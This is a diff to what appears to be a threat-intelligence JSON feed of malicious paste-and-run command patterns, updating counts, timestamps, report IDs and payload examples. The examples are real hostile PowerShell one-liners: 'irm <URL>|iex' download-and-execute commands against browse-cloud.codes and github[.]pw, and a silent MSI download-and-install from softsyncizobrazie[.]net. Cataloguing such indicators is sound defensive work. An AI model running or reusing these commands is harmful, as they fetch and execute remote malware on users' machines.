@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 118,
-    "ReportCount": 118,
+    "DistinctPayloadCount": 119,
+    "ReportCount": 119,
     "FirstSeen": "2026-11-10T09:55:19.073000+00:00",
-    "LastSeen": "2026-11-13T18:15:29.326000+00:00",
+    "LastSeen": "2026-11-14T01:23:57.427000+00:00",
     "ReportIds": [
       "cmwaikzu608q10omllivblirh",
       "cmwaila5l08ql0omlduekey7c",
@@ -123,7 +123,8 @@
       "cmwey02zr0eyu0omlwwzxamhx",
       "cmwey0zxj0f220omls520xd1u",
       "cmwf4esed0fpg0omlmg0cwhh2",
-      "cmwfarrwk0fv70oml64i0nnlm"
+      "cmwfarrwk0fv70oml64i0nnlm",
+      "cmwfq2sdt0iq70omlfqlpffxx"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -138,6 +139,7 @@
       "irm 'browse-cloud.codes/4b7ddb4fc39a9ff3'|iex;",
       "irm 'browse-cloud.codes/517644a705a49caa'|iex;",
       "irm 'browse-cloud.codes/5d69fe5eb757ed96'|iex;",
+      "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
       "irm 'browse-cloud.codes/62f2ca8cc1e23e58'|iex;",
       "irm 'browse-cloud.codes/63534eff5860c270'|iex;",
       "irm 'browse-cloud.codes/64ad9546201e2c1d'|iex;",
@@ -248,10 +250,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 31,
-    "ReportCount": 31,
+    "DistinctPayloadCount": 32,
+    "ReportCount": 32,
     "FirstSeen": "2026-11-09T06:43:14.799000+00:00",
-    "LastSeen": "2026-11-13T10:17:10.356000+00:00",
+    "LastSeen": "2026-11-14T01:19:02.441000+00:00",
     "ReportIds": [
       "cmw8wa50e27cu0oml8fw7ot3c",
       "cmw90mp0b2ggo0omlygm6nltz",
@@ -283,13 +285,15 @@
       "cmwe9et4u0aaj0omlc9yh4b8o",
       "cmwe9i80d0ahm0oml42mzaj6h",
       "cmwetnpgn0e5q0omlfbiurb7r",
-      "cmwetonos0e7e0omltax78jeq"
+      "cmwetonos0e7e0omltax78jeq",
+      "cmwfpwgss0ihy0omlygayvwid"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/91d7167f548d874c')|iex",
       "(irm 'https://github[.]pw/8pchkbdes5/aade9cba2680d7ba')|iex",
       "(irm 'https://github[.]pw/Girya/14683ec92db74be1')|iex",
       "(irm 'https://github[.]pw/Girya/14da35a99099ddf9')|iex",
+      "(irm 'https://github[.]pw/Girya/1a887bc54c6d3982')|iex",
       "(irm 'https://github[.]pw/Girya/31a53bceab62dcdb')|iex",
       "(irm 'https://github[.]pw/Girya/50f3987165a83e1e')|iex",
       "(irm 'https://github[.]pw/Girya/515e7592fa3dc4df')|iex",
@@ -744,9 +748,9 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 24,
+    "ReportCount": 25,
     "FirstSeen": "2026-11-09T08:46:08.425000+00:00",
-    "LastSeen": "2026-11-13T18:58:09.495000+00:00",
+    "LastSeen": "2026-11-14T01:20:56.286000+00:00",
     "ReportIds": [
       "cmw90o6il2gli0omlwlr2xrzm",
       "cmwclwpgw0a210omltnipi6za",
@@ -771,7 +775,8 @@
       "cmwezgr170fas0omlma6arc0q",
       "cmwf2w2a00fkl0oml1ac8kcxp",
       "cmwf9tn7k0fqr0omliwntu216",
-      "cmwfcanbl0gd80omlgekvfmd3"
+      "cmwfcanbl0gd80omlgekvfmd3",
+      "cmwfpywm20ikw0omloshmzs1c"
     ],
     "PayloadExamples": [
       "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit"
